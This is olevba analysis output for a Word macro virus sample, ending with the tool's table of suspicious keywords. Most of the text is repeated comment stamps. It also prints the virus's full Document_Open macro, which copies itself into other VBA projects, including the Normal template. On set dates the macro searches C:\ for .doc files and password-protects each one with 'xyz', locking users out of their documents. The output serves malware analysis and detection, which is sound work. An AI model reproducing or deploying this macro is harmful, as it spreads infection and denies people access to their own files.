olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Eight941.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Eight941.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Laboratorio de Informatica
' LdI
'
' 05/01/80 23:41:18
'
' Laboratorio de Informatica
' LdI
'
' 05/01/80 02:53:20
'
' Laboratorio de Informatica
' LdI
'
' 07/06/01 21:22:23
'
' Laboratorio de Informatica
' LdI
'
' 07/06/01 18:26:00
'
' Laboratorio de Informatica
' LdI
'
' 04/01/95 23:54:17
'
' Laboratorio de Informatica
' LdI
'
' 05/01/95 17:05:40
'
' Laboratorio de Informatica
' LdI
'
' 05/01/95 07:51:56
'
' 309
' 3
'
' 22/05/01 17:47:24
'
' Laboratorio de Informatica
' LdI
'
' 22/05/2001 16:19:03
'
' Raiz
' R
'
' 23/02/00 19:13:07
'
' Raiz
' R
'
' 23/02/00 17:34:12
'
' Raiz
' R
'
' 23/02/00 17:18:54
'
' Raiz
' R
'
' 23/02/00 17:18:16
'
' Raiz
' R
'
' 23/02/00 16:33:28
'
' Raiz
' R
'
' 23/02/00 16:17:41
'
' Raiz
' R
'
' 23/02/00 15:51:16
'
' Raiz
' R
'
' 23/02/00 15:20:07
'
' Raiz
' R
'
' 23/02/00 14:35:10
'
' Raiz
' R
'
' 23/02/00 14:34:40
'
' Raiz
' R
'
' 23/02/00 14:06:39
'
' Raiz
' R
'
' 23/02/00 13:41:54
'
' Raiz
' R
'
' 23/02/00 13:40:08
'
' Raiz
' R
'
' 23/02/00 10:24:50
'
' Raiz
' R
'
' 22/02/00 18:31:42
'
' Raiz
' R
'
' 22/02/00 17:49:43
'
' Raiz
' R
'
' 22/02/00 17:19:24
'
' Raiz
' R
'
' 22/02/00 17:18:43
'
' Raiz
' R
'
' 22/02/00 17:11:10
'
' Raiz
' R
'
' 22/02/00 17:10:51
'
' Raiz
' R
'
' 22/02/00 17:10:41
'
' Raiz
' R
'
' 22/02/00 14:31:59
'
' Raiz
' R
'
' 22/02/00 14:27:55
'
' Raiz
' R
'
' 22/02/00 14:24:18
'
' Raiz
' R
'
' 22/02/00 14:13:32
'
' Raiz
' R
'
' 22/02/00 14:12:11
'
' Raiz
' R
'
' 22/02/00 14:08:51
'
' Raiz
' R
'
' 22/02/00 13:11:05
'
' Raiz
' R
'
' 22/02/00 13:09:58
'
' Raiz
' R
'
' 22/02/00 13:09:36
'
' Raiz
' R
'
' 22/02/00 13:07:34
'
' Raiz
' R
'
' 22/02/00 12:07:43
'
' Raiz
' R
'
' 22/02/00 12:07:11
'
' Raiz
' R
'
' 22/02/00 12:06:56
'
' Raiz
' R
'
' 22/02/00 12:06:28
'
' Raiz
' R
'
' 22/02/00 12:06:04
'
' Raiz
' R
'
' 22/02/00 12:04:32
'
' Raiz
' R
'
' 22/02/00 11:42:54
'
' Raiz
' R
'
' 22/02/00 10:09:13
'
Private Sub Document_Open()
On Error GoTo 0
Dim i, j As Integer
j = -1
For i = 1 To Application.VBE.VBProjects.Count
    If Application.VBE.VBProjects(i).Name = "Normal" Then
        j = i
    End If
    If Application.VBE.VBProjects(i).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = False Then
        Dim B, l As Integer
            If j > 0 Then
                If Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = True Then
                    B = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Lines(B, B + l)
                Else
                    B = Me.VBProject.VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Me.VBProject.VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Me.VBProject.VBComponents(1).CodeModule.Lines(B, B + l)
            End If
        End If
    End If
Next i
If (Month(Date) = 11 And Day(Date) = 10) Or (Month(Date) = 7 And Day(Date) = 1) Then
Set fs = Application.FileSearch
    fs.LookIn = "c:\"
    fs.FileName = "*.doc"
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            On Error GoTo Exitsub
            Documents.Open FileName:=fs.FileSearch, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False
            Options.AllowFastSave = True
            Options.BackgroundSave = True
            Options.CreateBackup = False
            Options.SavePropertiesPrompt = False
            Options.SaveNormalPrompt = False
            ActiveDocument.Password = "xyz"
            ActiveDocument.Save
            ActiveDocument.Close
Exitsub:
        On Error GoTo 0
        
        Next i
    End If
End If
End Sub



























' Lab
' L
'
' 21/05/01 18:38:12
'
' Lab
' L
'
' 21/05/01 18:37:09
'
' Laboratorio de Informatica
' LdI
'
' 21/05/01 17:24:56
'
' Laboratorio de Informatica
' LdI
'
' 21/05/01 16:13:48
'
' Laboratorio de Informatica
' LdI
'
' 21/05/01 15:41:10
'
' Laboratorio de Informatica
' LdI
'
' 21/05/01 15:22:44
'
' Laboratorio de Informatica
' LdI
'
' 21/05/01 15:20:38
'
' Laboratorio de Informatica
' LdI
'
' 21/05/01 15:18:43
'
' Laboratorio de Informatica
' LdI
'
' 21/05/01 15:16:58
'
' Laboratorio de Informatica
' LdI
'
' 21/05/01 13:21:59
'
' Laboratorio de Informatica
' LdI
'
' 21/05/01 08:43:26
'
' Laboratorio de Informatica
' LdI
'
' 19/05/01 10:26:35
'
' Laboratorio de Informatica
' LdI
'
' 18/05/01 17:06:24
'
' Laboratorio de Informatica
' LdI
'
' 18/05/01 16:43:27
'
' Laboratorio de Informatica
' LdI
'
' 18/05/01 12:57:12
'
' Laboratorio de Informatica
' LdI
'
' 18/05/01 10:05:29
'
' Laboratorio de Informatica
' LdI
'
' 17/05/01 16:07:31
'
' Laboratorio de Informatica
' LdI
'
' 17/05/01 16:03:47
'
' Laboratorio de Informatica
' LdI
'
' 17/05/01 10:29:26
'
' Laboratorio de Informatica
' LdI
'
' 14/05/01 21:52:42
'
' Laboratorio de Informatica
' LdI
'
' 14/05/01 20:44:08
'
' Laboratorio de Informatica
' LdI
'
' 14/05/01 19:05:51
'
' Laboratorio de Informatica
' LdI
'
' 14/05/01 18:41:10
'
' Laboratorio de Informatica
' LdI
'
' 14/05/01 18:39:54
'
' Laboratorio de Informatica
' LdI
'
' 11/05/01 20:47:14
'
' Laboratorio de Informatica
' LdI
'
' 11/05/01 12:38:52
'
' Laboratorio de Informatica
' LdI
'
' 11/05/01 12:31:23
'
' Laboratorio de Informatica
' LdI
'
' 11/05/01 12:06:32
'
' Laboratorio de Informatica
' LdI
'
' 10/05/01 19:40:29
'
' Laboratorio de Informatica
' LdI
'
' 10/05/01 18:12:50
'
' Laboratorio de Informatica
' LdI
'
' 10/05/01 17:45:41
'
' Laboratorio de Informatica
' LdI
'
' 10/05/01 17:29:23
'
' Laboratorio de Informatica
' LdI
'
' 10/05/01 17:28:04
'
' Laboratorio de Informatica
' LdI
'
' 10/05/01 15:03:00
'
' Laboratorio de Informatica
' LdI
'
' 10/05/01 12:52:29
'
' Laboratorio de Informatica
' LdI
'
' 10/05/01 12:51:53
'
' Laboratorio de Informatica
' LdI
'
' 10/05/01 12:48:45
'
' Laboratorio de Informatica
' LdI
'
' 10/05/01 12:40:46
'
' Laboratorio de Informatica
' LdI
'
' 10/05/01 12:35:34
'
' Laboratorio de Informatica
' LdI
'
' 10/05/01 12:32:48
'
' Laboratorio de Informatica
' LdI
'
' 10/05/01 12:28:21
'
' Laboratorio de Informatica
' LdI
'
' 10/05/01 12:16:51
'
' Laboratorio de Informatica
' LdI
'
' 10/05/01 08:55:12
'
' Laboratorio de Informatica
' LdI
'
' 09/05/01 16:11:19
'
' Laboratorio de Informatica
' LdI
'
' 09/05/01 12:31:52
'
' Laboratorio de Informatica
' LdI
'
' 09/05/01 11:44:32
'
' Laboratorio de Informatica
' LdI
'
' 08/05/01 21:22:30
'
' Laboratorio de Informatica
' LdI
'
' 08/05/01 19:19:48
'
' Laboratorio de Informatica
' LdI
'
' 08/05/01 18:52:38
'
' Laboratorio de Informatica
' LdI
'
' 08/05/01 15:15:32
'
' Laboratorio de Informatica
' LdI
'
' 08/05/01 13:25:18
'
' Laboratorio de Informatica
' LdI
'
' 08/05/01 13:03:20
'
' Laboratorio de Informatica
' LdI
'
' 07/05/01 19:15:01
'
' Laboratorio de Informatica
' LdI
'
' 07/05/01 19:10:29
'
' Laboratorio de Informatica
' LdI
'
' 07/05/01 19:07:41
'
' Laboratorio de Informatica
' LdI
'
' 07/05/01 16:26:13
'
' Laboratorio de Informatica
' LdI
'
' 07/05/01 16:07:48
'
' Laboratorio de Informatica
' LdI
'
' 07/05/01 12:20:37
'
' Laboratorio de Informatica
' LdI
'
' 07/05/01 10:08:32
'
' Laboratorio de Informatica
' LdI
'
' 07/05/01 09:00:36
'
' Laboratorio de Informatica
' LdI
'
' 07/05/01 08:53:53
'
' Laboratorio de Informatica
' LdI
'
' 07/05/01 08:11:29
'
' Laboratorio de Informatica
' LdI
'
' 05/05/01 12:22:16
'
' Laboratorio de Informatica
' LdI
'
' 05/05/01 09:20:24
'
' Laboratorio de Informatica
' LdI
'
' 03/05/01 10:34:30
'
' Laboratorio de Informatica
' LdI
'
' 02/05/01 18:22:39
'
' Laboratorio de Informatica
' LdI
'
' 02/05/01 17:41:30
'
' Laboratorio de Informatica
' LdI
'
' 27/04/01 17:10:47
'
' Laboratorio de Informatica
' LdI
'
' 27/04/01 17:04:47
'
' Laboratorio de Informatica
' LdI
'
' 27/04/01 17:02:11
'
' Laboratorio de Informatica
' LdI
'
' 27/04/01 16:51:08
'
' Laboratorio de Informatica
' LdI
'
' 27/04/01 12:33:15
'
' Laboratorio de Informatica
' LdI
'
' 27/04/01 11:18:04
'
' Laboratorio de Informatica
' LdI
'
' 26/04/01 21:22:38
'
' Laboratorio de Informatica
' LdI
'
' 25/04/01 21:34:27
'
' Laboratorio de Informatica
' LdI
'
' 25/04/01 21:32:39
'
' Laboratorio de Informatica
' LdI
'
' 25/04/01 18:57:33
'
' Laboratorio de Informatica
' LdI
'
' 25/04/01 18:53:40
'
' Laboratorio de Informatica
' LdI
'
' 24/04/01 15:11:53
'
' Laboratorio de Informatica
' LdI
'
' 24/04/01 13:50:44
'
' Laboratorio de Informatica
' LdI
'
' 23/04/01 21:38:28
'
' Laboratorio de Informatica
' LdI
'
' 23/04/01 21:36:36
'
' Laboratorio de Informatica
' LdI
'
' 23/04/01 20:41:25
'
' Laboratorio de Informatica
' LdI
'
' 23/04/01 15:03:20
'
' Laboratorio de Informatica
' LdI
'
' 23/04/01 13:02:49
'
' Laboratorio de Informatica
' LdI
'
' 23/04/01 11:53:52
'
' Laboratorio de Informatica
' LdI
'
' 23/04/01 11:52:49
'
' Laboratorio de Informatica
' LdI
'
' 23/04/01 10:10:35
'
' Laboratorio de Informatica
' LdI
'
' 23/04/01 08:47:51
'
' Laboratorio de Informatica
' LdI
'
' 23/04/01 08:36:04
'
' Laboratorio de Informatica
' LdI
'
' 23/04/01 08:35:44
'
' Laboratorio de Informatica
' LdI
'
' 20/04/01 19:27:59
'
' Laboratorio de Informatica
' LdI
'
' 20/04/01 18:40:35
'
' Laboratorio de Informatica
' LdI
'
' 20/04/01 18:37:54
'
' Laboratorio de Informatica
' LdI
'
' 20/04/01 18:35:07
'
' Laboratorio de Informatica
' LdI
'
' 20/04/01 18:13:55
'
' Laboratorio de Informatica
' LdI
'
' 20/04/01 18:12:10
'
' Laboratorio de Informatica
' LdI
'
' 20/04/01 18:11:27
'
' Laboratorio de Informatica
' LdI
'
' 20/04/01 18:10:41
'
' Laboratorio de Informatica
' LdI
'
' 20/04/01 17:40:02
'
' Laboratorio de Informatica
' LdI
'
' 20/04/01 15:20:00
'
' Laboratorio de Informatica
' LdI
'
' 19/04/01 21:15:39
'
' Laboratorio de Informatica
' LdI
'
' 19/04/01 20:10:20
'
' Laboratorio de Informatica
' LdI
'
' 19/04/01 11:50:57
'











+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

